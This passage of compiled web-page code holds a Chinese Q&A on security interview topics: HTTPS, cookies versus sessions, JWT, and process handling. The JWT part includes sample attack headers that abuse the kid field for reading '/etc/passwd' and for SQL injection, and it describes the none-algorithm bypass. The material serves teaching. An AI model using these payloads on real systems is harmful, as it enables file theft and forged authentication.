</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>Ajax发送POST请求会发几个数据包？</summary><p>两个，一个OPTIONS预请求，一个发送数据的请求</p></details><details class="custom-container details"><summary>HTTPS连接建立过程？</summary><p>1、客户端发送支持的加密协议版本（TLS）</p><p>2、服务器从中筛选合适的加密协议版本</p><p>3、服务器端返回证书，证书中有公钥</p><p>4、客户端使用根证书验证证书合法性</p><p>5、客户端生成对称密钥，通过证书中的公钥加密，发送到服务端</p><p>6、服务端使用私钥解密，获取对称密钥，使用对称密钥加密数据</p><p>7、客户端解密数据，SSL加密通信建立，开始通信......</p></details><details class="custom-container details"><summary>Cookie和Session有什么区别 ，后端Session是如何进行保存的？</summary><p>Cookie保存在客户端，Session保存在服务端。</p><ul><li>创建唯一的Session ID，将其关联到用户请求。</li><li>在服务器端创建一个对应的Session对象，用于存储和管理与该Session ID相关的数据。</li><li>将Session ID发送到客户端，通常通过Cookie或URL重写。</li><li>在后续的用户请求中，服务器通过Session ID来查找和恢复对应的Session对象，从而实现数据读取和写入。</li></ul></details>`,77),P={class:"custom-container details"},w=s("summary",null,"JWT Token是什么，有什么安全上的风险？",-1),C={href:"https://jwt.io/",target:"_blank",rel:"noopener noreferrer"},q=e(`<p>JWT（JSON Web Token）是一种用于身份验证和授权的开放标准，用于在不同系统之间传输信息。</p><p>JWT由三个部分组成，这些部分使用点（.）分隔。</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code>header.payload.signature
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ol><li><strong>Header（头部）</strong>: 包含有关JWT的元数据和算法信息。它通常包含两个字段：<code>alg</code>（用于指定用于签名的算法，例如HMAC SHA256或RSA）和<code>typ</code>（类型，通常值为&quot;JWT&quot;）。</li><li><strong>Payload（负载）</strong>: 包含要传输的数据。Payload中的数据称为声明（claims），声明是有关实体（通常是用户）和其他数据的声明。声明分为三种类型：注册声明（注册的声明名称，例如&quot;iss&quot;表示签发者），公共声明（预定义的声明名称，但不强制，例如&quot;sub&quot;表示主题），和私有声明（自定义声明名称）。</li><li><strong>Signature（签名）</strong>: 用于验证消息的完整性和身份验证。签名使用Header中指定的算法以及一个密钥，将Header和Payload进行签名。签名是将Header、Payload和密钥结合在一起通过指定算法生成的哈希值。</li></ol><p>JWT Token的优点：</p><ul><li>简单：由于信息是以JSON格式存储的，因此易于解析和处理。</li><li>自包含：所有必要的信息都包含在Token本身中，无需查询数据库。</li><li>可扩展：可以添加自定义声明来满足特定需求。</li></ul><p>安全上的风险：</p><ul><li><strong>JWT Token伪造</strong>: 如果JWT Token中的Payload部分是可以被用户篡改的，攻击者可能会修改Token中的数据以获取未授权的权限(改用户名和ID获取对应权限，需要知道密钥，密钥一般硬编码在源码里)。</li><li><strong>Token过期问题</strong>: JWT可以设置过期时间（exp）来限制Token的有效期，如果过期时间太长，增加了泄露风险。攻击者可以使用它来冒充用户或访问受保护的资源。</li><li><strong>JWT None攻击</strong>：JWT支持使用空加密算法，可以在header中指定alg为<code>None</code>。这样的话，只要把signature设置为空（即不添加签名字段），提交到服务器，任何token都可以通过服务器的验证。</li><li><strong>KID参数</strong>：<code>kid</code>是jwt header中的一个可选参数，全称是<code>key ID</code>，它用于指定加密算法的密钥。</li></ul><p><strong>任意文件读取</strong></p><p><code>kid</code>参数用于读取密钥文件，但系统并不会知道用户想要读取的到底是不是密钥文件，所以，如果在没有对参数进行过滤的前提下，攻击者是可以读取到系统的任意文件的。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>{
    &quot;alg&quot; : &quot;HS256&quot;,
    &quot;typ&quot; : &quot;jwt&quot;,
    &quot;kid&quot; : &quot;/etc/passwd&quot;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>SQL注入</strong></p><p><code>kid</code>也可以从数据库中提取数据，这时候就有可能造成SQL注入攻击，通过构造SQL语句来获取数据或者是绕过signature的验证</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>{
    &quot;alg&quot; : &quot;HS256&quot;,
    &quot;typ&quot; : &quot;jwt&quot;,
    &quot;kid&quot; : &quot;key11111111&#39; || union select &#39;secretkey&#39; -- &quot;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,14),D=e('<details class="custom-container details"><summary>僵尸进程和孤儿进程的区别是什么?</summary><p>正常情况下子进程由父进程创建，子进程再创建子进程，这是一个异步过程，父进程无法预测子进程的结束，所以子进程结束后它的父进程会调用<code>wait()</code>或者<code>waitpid()</code>取得子进程的终止状态，回收子进程资源。</p><p>孤儿进程：父进程已经结束，而它的子进程还在运行，这些子进程就是孤儿进程（father died）</p><p>孤儿进程的资源由<code>init</code>守护进程（pid=1）回收，因此孤儿进程没什么危害。</p><p>僵尸进程：子进程退出了，父进程没用wait()获取子进程的终止状态信息，子进程描述符还在系统中。</p><p>系统中所能使用的进程号是有限的，如果大量产生僵尸进程，将因没有可用的进程号而导致系统无法产生新的进程。可以通过信号机制，子进程退出时向父进程发送SIGCHLD信号解决僵尸进程问题。</p><p>暴力解决办法直接杀死其父进程，让init进程接管做资源回收。</p></details>',1);function _(L,R){const n=o("ExternalLinkIcon");return l(),p("div",null,[c,s("p",null,[s("a",r,[a("https://xz.aliyun.com/t/7911"),t(n)])]),u,s("details",m,[v,k,b,s("p",null,[s("a",h,[a("https://blog.csdn.net/weixin_39685392/article/details/111293939"),t(n)])])]),g,s("details",y,[S,s("p",null,[a('1）空间搜索引擎（title="xxx"、cert="'),s("a",x,[a("xxx.com"),t(n)]),a('"、icon_hash="xxx"）')]),T,I]),f,s("details",P,[w,s("p",null,[s("a",C,[a("https://jwt.io/"),t(n)])]),q]),D])}const W=i(d,[["render",_],["__file","mj.html.vue"]]);export{W as default};
